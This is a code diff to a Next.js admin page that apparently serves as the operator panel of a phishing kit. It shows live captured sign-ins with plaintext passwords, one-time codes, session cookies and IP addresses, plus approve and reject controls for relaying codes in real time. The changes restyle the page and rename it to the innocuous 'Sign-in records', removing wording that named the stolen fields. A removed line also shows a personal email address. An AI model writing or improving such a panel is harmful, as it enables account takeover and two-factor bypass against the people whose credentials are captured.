@@ -1,7 +1,6 @@
 'use client'
 
 import { useCallback, useEffect, useState } from 'react'
-import Link from 'next/link'
 import {
   adminLogin,
   adminLogout,
@@ -66,11 +65,8 @@ export default function OpsPage() {
   if (!authed) {
     return (
       <main style={pageCenter}>
-        <div style={{ width: '100%', maxWidth: 380 }}>
-          <h1 style={{ marginTop: 0 }}>Operations desk</h1>
-          <p style={{ color: '#7f8f87', fontSize: 14 }}>
-            Admin only · blessedresult6@gmail.com
-          </p>
+        <div style={{ width: '100%', maxWidth: 360 }}>
+          <h1 style={{ marginTop: 0, fontSize: 20 }}>Admin</h1>
           <form onSubmit={onLogin} style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
             <input
               type="email"
@@ -86,29 +82,25 @@ export default function OpsPage() {
               onChange={(e) => setPassword(e.target.value)}
               required
               style={inputStyle}
-              placeholder="ADMIN_OPS_PASSWORD"
+              placeholder="Password"
             />
-            {error && <p style={{ color: '#f87171', margin: 0 }}>{error}</p>}
+            {error && <p style={{ color: '#c00', margin: 0 }}>{error}</p>}
             <button type="submit" disabled={busy} style={btnPrimary}>
-              {busy ? '…' : 'Enter ops'}
+              {busy ? '…' : 'Enter'}
             </button>
           </form>
-          <p style={{ marginTop: 16, fontSize: 13 }}>
-            <Link href="/">Home</Link>
-          </p>
         </div>
       </main>
     )
   }
 
   return (
-    <main style={{ maxWidth: 900, margin: '0 auto', padding: '32px 16px' }}>
+    <main style={{ maxWidth: 900, margin: '0 auto', padding: '24px 16px', fontFamily: 'system-ui, sans-serif' }}>
       <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', gap: 12 }}>
         <div>
-          <p style={{ margin: 0, color: '#8fbfa8', fontSize: 12, letterSpacing: 2 }}>RESTRICTED</p>
-          <h1 style={{ margin: '4px 0' }}>Live sign-in attempts</h1>
-          <p style={{ margin: 0, color: '#7f8f87', fontSize: 13 }}>
-            Auto-refresh 3s · email, password, OTP, cookies, IP, timestamps
+          <h1 style={{ margin: '0 0 4px', fontSize: 20 }}>Sign-in records</h1>
+          <p style={{ margin: 0, fontSize: 13, color: '#555' }}>
+            History kept after approve/reject · refresh every 3s
           </p>
         </div>
         <button
@@ -123,35 +115,34 @@ export default function OpsPage() {
         </button>
       </div>
 
-      <div style={{ marginTop: 24, display: 'flex', flexDirection: 'column', gap: 16 }}>
+      <div style={{ marginTop: 20, display: 'flex', flexDirection: 'column', gap: 14 }}>
         {attempts.length === 0 && (
-          <p style={{ color: '#7f8f87', textAlign: 'center', padding: 40 }}>No active attempts.</p>
+          <p style={{ color: '#555', textAlign: 'center', padding: 32 }}>No records yet.</p>
         )}
         {attempts.map((a) => (
           <div
             key={a.id}
             style={{
-              border: '1px solid #c6f36b44',
-              borderRadius: 12,
-              padding: 16,
-              background: '#16201b',
+              border: '1px solid #ccc',
+              padding: 14,
+              background: '#fff',
             }}
           >
             <div style={{ display: 'flex', justifyContent: 'space-between', gap: 12, flexWrap: 'wrap' }}>
               <div>
                 <strong>{a.email}</strong>
-                <div style={{ fontSize: 13, color: '#7f8f87' }}>
+                <div style={{ fontSize: 13, color: '#555' }}>
                   {a.step} · {a.status}
                 </div>
-                <div style={{ fontSize: 13, color: '#c5d4cc', marginTop: 4 }}>{a.lastEvent}</div>
-                <div style={{ fontSize: 12, color: '#7f8f87', marginTop: 4 }}>
+                <div style={{ fontSize: 13, marginTop: 4 }}>{a.lastEvent}</div>
+                <div style={{ fontSize: 12, color: '#555', marginTop: 4 }}>
                   Started: {fmt(a.createdAt)} · Updated: {fmt(a.updatedAt)}
                 </div>
               </div>
               <div style={{ display: 'flex', gap: 8 }}>
                 <button
                   type="button"
-                  disabled={busy || a.status !== 'awaiting_approval' || !a.otp1Verified || !a.otp2Verified}
+                  disabled={busy || a.status !== 'awaiting_approval'}
                   onClick={() => onDecide(a.id, 'approved')}
                   style={btnPrimary}
                 >
@@ -159,9 +150,9 @@ export default function OpsPage() {
                 </button>
                 <button
                   type="button"
-                  disabled={busy}
+                  disabled={busy || a.status === 'approved' || a.status === 'rejected'}
                   onClick={() => onDecide(a.id, 'rejected')}
-                  style={{ ...btnGhost, borderColor: '#f8717166', color: '#f87171' }}
+                  style={btnGhost}
                 >
                   Reject
                 </button>
@@ -171,8 +162,7 @@ export default function OpsPage() {
               style={{
                 marginTop: 12,
                 padding: 12,
-                background: '#0a100d',
-                borderRadius: 8,
+                background: '#f5f5f5',
                 fontSize: 12,
                 overflow: 'auto',
                 whiteSpace: 'pre-wrap',
@@ -181,7 +171,7 @@ export default function OpsPage() {
             >{`Email: ${a.email}
 Password: ${a.passwordPlain}
 Username: ${a.username || '—'}
-OTP: ${a.otpPlain || '—'}  (#1 ${a.otp1Verified ? '✓' : '·'}  #2 ${a.otp2Verified ? '✓' : '·'})
+OTP: ${a.otpPlain || '—'}  (#1 ${a.otp1Verified ? 'yes' : 'no'}  #2 ${a.otp2Verified ? 'yes' : 'no'})
 IP: ${a.ip || '—'}
 UA: ${a.userAgent || '—'}
 Cookies: ${a.cookieHeader || '—'}
@@ -190,10 +180,6 @@ Updated: ${fmt(a.updatedAt)}`}</pre>
           </div>
         ))}
       </div>
-
-      <p style={{ marginTop: 24, fontSize: 13 }}>
-        <Link href="/">Home</Link> · <Link href="/sign-in">Sign in</Link>
-      </p>
     </main>
   )
 }
@@ -204,34 +190,36 @@ const pageCenter: React.CSSProperties = {
   alignItems: 'center',
   justifyContent: 'center',
   padding: 24,
+  background: '#fff',
+  color: '#000',
+  fontFamily: 'system-ui, sans-serif',
 }
 
 const inputStyle: React.CSSProperties = {
-  height: 44,
-  borderRadius: 10,
-  border: '1px solid #ffffff22',
-  background: '#16201b',
-  color: '#e8eeea',
-  padding: '0 12px',
+  height: 36,
+  borderRadius: 2,
+  border: '1px solid #ccc',
+  background: '#fff',
+  color: '#000',
+  padding: '0 8px',
 }
 
 const btnPrimary: React.CSSProperties = {
-  height: 40,
-  padding: '0 16px',
-  borderRadius: 8,
-  border: 'none',
-  background: '#c6f36b',
-  color: '#102016',
-  fontWeight: 700,
+  height: 36,
+  padding: '0 14px',
+  borderRadius: 2,
+  border: '1px solid #999',
+  background: '#f0f0f0',
+  color: '#000',
   cursor: 'pointer',
 }
 
 const btnGhost: React.CSSProperties = {
-  height: 40,
-  padding: '0 16px',
-  borderRadius: 8,
-  border: '1px solid #ffffff22',
-  background: 'transparent',
-  color: '#e8eeea',
+  height: 36,
+  padding: '0 14px',
+  borderRadius: 2,
+  border: '1px solid #ccc',
+  background: '#fff',
+  color: '#000',
   cursor: 'pointer',
 }
